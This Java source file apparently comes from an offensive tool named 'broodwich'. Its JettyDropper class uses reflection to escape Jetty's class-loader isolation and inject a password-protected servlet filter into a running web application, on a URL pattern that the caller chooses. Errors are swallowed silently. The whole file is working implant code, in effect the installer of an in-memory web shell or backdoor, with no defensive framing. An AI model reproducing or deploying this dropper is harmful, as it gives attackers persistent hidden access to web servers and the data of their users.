/*
 * Copyright (c) 2019 Brian D. Hysell
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

package party.itistimeto.broodwich.droppers;

import org.eclipse.jetty.servlet.FilterHolder;
import org.eclipse.jetty.webapp.WebAppContext;

import javax.servlet.DispatcherType;
import java.security.PrivilegedExceptionAction;
import java.util.EnumSet;

public class JettyDropper implements PrivilegedExceptionAction<Void> {
    private static String pattern;
    private static String password;

    public static void taste(String pattern, String password) {
        // requires jetty 9.4: https://github.com/eclipse/jetty.project/commit/a311c8bde171551a57ff28c04851a3b53acfc1e0
        JettyDropper.pattern = pattern;
        JettyDropper.password = password;
        try {
            // seems like there should be a better way...
            Thread.currentThread().getContextClassLoader().getClass().getMethod("runWithServerClassAccess", java.security.PrivilegedExceptionAction.class).invoke(new JettyDropper());
        } catch (Exception ignored) {
        }
    }

    @Override
    public Void run() throws Exception {
        FilterHolder filter = new FilterHolder(new BroodwichFilter(password));
        WebAppContext.getCurrentWebAppContext().addFilter(filter, pattern, EnumSet.of(DispatcherType.REQUEST));
        return null;
    }
}
